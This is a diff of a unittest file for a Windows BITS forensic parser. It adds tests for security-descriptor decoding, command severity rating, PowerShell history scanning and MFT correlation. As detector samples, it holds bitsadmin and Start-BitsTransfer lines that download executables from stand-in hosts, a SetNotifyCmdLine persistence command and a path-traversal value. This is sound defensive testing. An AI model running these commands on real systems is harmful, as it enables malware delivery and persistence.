@@ -8,7 +8,7 @@
 
 Run:  .venv\\Scripts\\python -m unittest -v test_bits_qmgr_parser
 """
-import csv, datetime as dt, json, os, random, struct, subprocess, sys
+import csv, json, os, random, struct, subprocess, sys
 import tempfile, unittest, uuid
 from unittest import mock
 
@@ -29,68 +29,7 @@ EVIDENCE = os.environ.get("BITS_EVIDENCE") or EXPECT.get("evidence") or ""
 HAVE_EVIDENCE = bool(EVIDENCE) and os.path.exists(os.path.join(EVIDENCE, "qmgr.db"))
 
 
-# ------------------------------------------------------------------ builders
-def ustr(s):
-    s += "\x00"
-    return struct.pack("<I", len(s)) + s.encode("utf-16-le")
-
-
-def ftb(days, base=dt.datetime(2026, 1, 1)):
-    t = base + dt.timedelta(days=days)
-    return struct.pack("<Q", int((t - dt.datetime(1601, 1, 1)).total_seconds() * 10_000_000))
-
-
-def job_blob(name="System update", cmd="C:\\Users\\Public\\mail.exe", args="", state=4,
-             jtype=0, errors=1, file_ids=(), sid="S-1-5-21-1-2-3-1001", jid=None,
-             creator="C:\\Windows\\System32\\bitsadmin.exe", delim=None):
-    b = (delim or P.JOB_DELIMS[0]) + struct.pack("<IIII", jtype, 2, state, 0) + \
-        (jid or uuid.uuid4()).bytes_le
-    b += ustr(name) + ustr("desc") + ustr(cmd) + ustr(args) + ustr(sid)
-    b += struct.pack("<I", 3) + b"\x01" * 40
-    b += P.XFER_HDR + struct.pack("<I", len(file_ids)) + b"".join(
-        uuid.UUID(f).bytes_le for f in file_ids) + P.XFER_HDR
-    b += struct.pack("<I", errors)
-    for _ in range(errors):
-        b += struct.pack("<II", 0, 0x80072EE7) + struct.pack("<IIII", 1, 5, 3, 256) + b"\x00"
-    if not errors:
-        b += struct.pack("<I", 0)
-    b += struct.pack("<II", 60, 86400) + ftb(0) + ftb(1) + ftb(1) + ftb(1) + b"\x00" * 6 + ftb(1) + ftb(91)
-    b += ustr(creator) + ustr("GET") + (delim or P.JOB_DELIMS[0])
-    return b
-
-
-def file_blob(src="http://127.0.0.1/a.exe", dest="C:\\Users\\Public\\mail.exe", got=0, total=None):
-    b = P.FILE_DELIM + ustr(dest) + ustr(src) + ustr("C:\\Users\\Public\\BIT1.tmp")
-    b += struct.pack("<QQ", got, 0xFFFFFFFFFFFFFFFF if total is None else total) + b"\x00"
-    b += ustr("C:\\") + ustr("\\\\?\\Volume{00000000-0000-0000-0000-000000000000}\\") + b"\x00" * 60
-    return b + P.FILE_DELIM
-
-
-def fn_entry(name, days=0, size=123):
-    """INDX entry: 0x10 entry header + $FILE_NAME."""
-    nm = name.encode("utf-16-le")
-    body = struct.pack("<Q", 5 | (1 << 48)) + ftb(days) * 4 + struct.pack("<QQ", 4096, size) + \
-        struct.pack("<II", 0x20, 0) + bytes([len(name), 1]) + nm
-    ln = (0x10 + len(body) + 7) & ~7
-    hdr = struct.pack("<QHHI", 42, ln, len(body), 0)
-    return (hdr + body).ljust(ln, b"\x00")
-
-
-def indx_block(live, slack):
-    entries = b"".join(fn_entry(n, i) for i, n in enumerate(live))
-    end = struct.pack("<QHHI", 0, 0x10, 0, 2)                 # last-entry marker
-    first = 0x28
-    used = first + len(entries) + len(end)
-    b = bytearray(4096)
-    b[0:4] = b"INDX"
-    struct.pack_into("<HH", b, 4, 0x28 + 0x18 + 0x10, 1)       # usa_off past header, usa_cnt=1
-    struct.pack_into("<III", b, 0x18, first, used, 4096 - 0x18)
-    pos = 0x18 + first
-    b[pos:pos + len(entries) + len(end)] = entries + end
-    s = pos + len(entries) + len(end) + 64
-    for i, n in enumerate(slack):
-        e = fn_entry(n, 10 + i); b[s:s + len(e)] = e; s += len(e) + 8
-    return bytes(b)
+from bits_synth import ustr, ftb, job_blob, file_blob, indx_block, sd_blob  # noqa: E402
 
 
 def make_folder(root, nested=True, corrupt_db=False, extra=None):
@@ -410,6 +349,7 @@ class TestEvents(unittest.TestCase):
             jobs, ev = P.live_snapshot()
         self.assertEqual(ev, []); self.assertEqual(len(jobs), 1)
 
+    @unittest.skipUnless(os.name == "nt", "Windows PowerShell")
     def test_ps_error_surfaces(self):
         with self.assertRaises(RuntimeError):
             P._ps("throw 'boom'", timeout=60)
@@ -503,6 +443,142 @@ class TestPipeline(unittest.TestCase):
             self.assertTrue(os.path.exists(os.path.join(out, "bits_jobs.csv")))
 
 
+class TestSecurityDescriptor(unittest.TestCase):
+    def test_sid_str(self):
+        sd = sd_blob(owner="S-1-5-21-1-2-3-1001")
+        self.assertEqual(P.sid_str(sd, 20)[0], "S-1-5-21-1-2-3-1001")
+        self.assertEqual(P.sid_str(b"\x02" + bytes(20))[0], None)
+        self.assertEqual(P.sid_str(b"\x01\x0f" + bytes(10))[0], None)      # truncated
+
+    def test_decode_and_job_integration(self):
+        sd = sd_blob(owner="S-1-5-21-1-2-3-1001",
+                     aces=(("deny", 0xF003F, "S-1-5-7"), ("allow", 0xF003F, "S-1-5-32-544")))
+        d = P.decode_sd(sd)
+        self.assertEqual(d["sd_owner_sid"], "S-1-5-21-1-2-3-1001")
+        self.assertEqual(d["sd_dacl"], ["deny 0x000F003F S-1-5-7", "allow 0x000F003F S-1-5-32-544"])
+        if os.name == "nt":
+            self.assertTrue(d["sd_sddl"].startswith("O:S-1-5-21-1-2-3-1001"))
+        j, _ = P.parse_job(job_blob(sd=sd, sid="S-1-5-21-1-2-3-1001"))
+        self.assertEqual(j["sd_owner_sid"], "S-1-5-21-1-2-3-1001")
+        self.assertTrue(j["created"].startswith("2026-01-01"))            # alignment unaffected
+
+    def test_owner_mismatch_flag(self):
+        j, _ = P.parse_job(job_blob(sd=sd_blob(owner="S-1-5-18"), sid="S-1-5-21-1-2-3-1001",
+                                    cmd="", errors=0, state=6))
+        self.assertTrue(any("security-descriptor owner" in t for t in P.triage(j, [])))
+
+    def test_garbage_sd_is_ignored(self):
+        self.assertIn("sd_dacl", P.decode_sd(b"\x01\x00" + bytes(18)))
+        self.assertEqual(P.decode_sd(b"\x01"), {})
+        j, _ = P.parse_job(job_blob(sd=b"\x01" + os.urandom(60)))
+        self.assertEqual(j["name"], "System update")
+
+
+class TestExtraSources(unittest.TestCase):
+    def test_command_level(self):
+        self.assertEqual(P.command_level("bitsadmin /SetNotifyCmdLine job c:\\x.exe NUL"), "HIGH")
+        self.assertEqual(P.command_level("Start-BitsTransfer -Source http://127.0.0.1/a -Destination x"), "HIGH")
+        self.assertEqual(P.command_level("bitsadmin /transfer j http://evil.example/a.exe c:\\a.exe"), "MED")
+        self.assertEqual(P.command_level("Start-BitsTransfer -Source https://go.microsoft.com/x -Destination y"),
+                         "INFO")
+        self.assertEqual(P.command_level("Get-BitsTransfer -AllUsers"), "INFO")
+
+    def test_ps_history(self):
+        with tempfile.TemporaryDirectory() as d:
+            p = os.path.join(d, "ConsoleHost_history.txt")
+            with open(p, "w", encoding="utf-8") as fh:
+                fh.write("dir\nbitsadmin /create evil\nbitsadmin /SetNotifyCmdLine evil c:\\u\\x.exe NUL\n"
+                         "Get-BitsTransfer\ncd ..\n")
+            out = P.scan_ps_history(p)
+        self.assertEqual([c["line_no"] for c in out], [2, 3, 4])
+        self.assertEqual(out[1]["level"], "HIGH")
+        self.assertEqual(P.scan_ps_history(os.path.join(HERE, "nope.txt")), [])
+
+    def test_commands_from_ps_events(self):
+        evs = P.read_events(raw_json=json.dumps([
+            {"id": 4104, "time": "2026-11-27T01:00:00Z", "record": 9, "channel": "Microsoft-Windows-PowerShell/Operational",
+             "message": "Creating Scriptblock text", "data": {"ScriptBlockText":
+                 "$j = Start-BitsTransfer -Source http://10.0.0.5/p.exe -Destination $env:TEMP\\p.exe -Asynchronous"}},
+            {"id": 4104, "time": "2026-11-27T01:00:01Z", "record": 10, "channel": "Microsoft-Windows-PowerShell/Operational",
+             "message": "x", "data": {"ScriptBlockText": "Get-ChildItem"}}]))
+        cmds = P.commands_from_events(evs)
+        self.assertEqual(len(cmds), 1)
+        self.assertEqual(cmds[0]["level"], "MED")
+        self.assertIn("PowerShell", cmds[0]["kind"])
+
+    def test_delivery_optimization(self):
+        raw = json.dumps([{"source_url": "http://1d.tlu.dl.delivery.mp.microsoft.com/f", "caller": "WU Client Download",
+                           "size": 10}, {"source_url": "http://203.0.113.9/payload.bin", "caller": "?", "size": 5},
+                          {"source_url": None, "caller": "x"}])
+        do = P.delivery_optimization(raw_json=raw)
+        self.assertEqual([d["level"] for d in do], ["INFO", "MED", "INFO"])
+        self.assertEqual(P.delivery_optimization(raw_json=""), [])
+
+    def test_check_files_and_mount_root_containment(self):
+        with tempfile.TemporaryDirectory() as d:
+            os.makedirs(os.path.join(d, "Users", "Public"))
+            with open(os.path.join(d, "Users", "Public", "mail.exe"), "wb") as fh:
+                fh.write(b"MZ payload")
+            j, _ = P.parse_job(job_blob())
+            j["files"] = [{"source_url": "http://127.0.0.1/a.exe", "dest_file": "C:\\Users\\Public\\mail.exe",
+                           "tmp_file": "C:\\..\\..\\..\\Windows\\win.ini"}]
+            P.check_files([j], d)
+            lc = j["files"][0]["local_check"]
+            self.assertTrue(lc["exists"]); self.assertEqual(lc["size"], 10)
+            self.assertEqual(lc["sha256"], P.sha256(os.path.join(d, "Users", "Public", "mail.exe")))
+            self.assertNotIn("tmp_check", j["files"][0])                  # escape attempt refused
+            self.assertTrue(any("still on disk" in t for t in j["triage"]))
+            self.assertIsNone(P._map_path("http://x/y", d))
+            self.assertIsNone(P._map_path("%TEMP%\\x", d))
+
+    def test_mftecmd_csv(self):
+        with tempfile.TemporaryDirectory() as d:
+            p = os.path.join(d, "20261127_MFTECmd_$MFT_Output.csv")
+            with open(p, "w", encoding="utf-8-sig", newline="") as fh:
+                w = csv.writer(fh)
+                w.writerow(["EntryNumber", "SequenceNumber", "InUse", "ParentEntryNumber", "ParentPath",
+                            "FileName", "FileSize", "Created0x10", "Created0x30", "LastModified0x10"])
+                w.writerow([4242, 3, "False", 99, ".\\Users\\Public", "mail.exe", 10,
+                            "2026-01-01 00:00:05", "2026-01-01 00:00:05", "2026-01-01 00:00:06"])
+                w.writerow([5, 5, "True", 5, ".", "other.txt", 1, "", "", ""])
+            self.assertTrue(P.is_mftecmd_csv(p))
+            self.assertFalse(P.is_mftecmd_csv(os.path.join(HERE, "README.md")))
+            j, _ = P.parse_job(job_blob())
+            j["files"] = [{"source_url": "http://127.0.0.1/a.exe", "dest_file": "C:\\Users\\Public\\mail.exe"}]
+            self.assertEqual(P.correlate_mft([j], p), 1)
+            m = j["files"][0]["mft"][0]
+            self.assertEqual((m["entry"], m["in_use"]), ("4242", False))
+            self.assertTrue(any("DELETED" in t for t in j["triage"]))
+            # also picked up automatically by analyse()
+            make_folder(d, nested=False)
+            r = P.analyse(d)
+            self.assertTrue(any("$MFT CSV" in n for n in r["parse_notes"]))
+
+    def test_analyse_picks_up_history(self):
+        with tempfile.TemporaryDirectory() as d:
+            make_folder(d, nested=False, extra={"ConsoleHost_history.txt": b"bitsadmin /create x\n"})
+            r = P.analyse(d)
+        self.assertEqual(r["summary"]["commands"], 1)
+        self.assertEqual(r["commands"][0]["kind"], "PSReadLine history")
+
+    def test_live_extras_never_raises(self):
+        with mock.patch.object(P, "_ps", side_effect=RuntimeError("denied")):
+            x = P.live_extras()
+        self.assertEqual(x["do_downloads"], [])
+        self.assertGreaterEqual(len(x["notes"]), 2)
+
+    def test_cli_version_and_bad_input(self):
+        import contextlib, io
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
+            with self.assertRaises(SystemExit):
+                P.main(["--version"])
+            with self.assertRaises(SystemExit) as cm:
+                P.main(["-i", os.path.join(HERE, "does_not_exist"), "-o", "x"])
+        self.assertEqual(cm.exception.code, 2)
+        self.assertIn(P.__version__, buf.getvalue())
+
+
 class TestDemoData(unittest.TestCase):
     def test_demo_folder_levels_and_links(self):
         import make_demo_data
@@ -553,6 +629,11 @@ class TestRealEvidence(unittest.TestCase):
     def test_i30_lists_queue_files(self):
         if self.r["i30"]:
             self.assertIn("qmgr.db", {e["name"] for e in self.r["i30"]})
+
+    def test_security_descriptor_owner_matches_job_owner(self):
+        withsd = [j for j in self.r["jobs"] if j.get("sd_owner_sid")]
+        self.assertGreater(len(withsd), 0.9 * len(self.r["jobs"]))
+        self.assertEqual([j["job_id"] for j in withsd if j["sd_owner_sid"] != j["owner_sid"]], [])
 
     # exact values - only when local_expectations.json describes this export
     def test_exact_expectations(self):
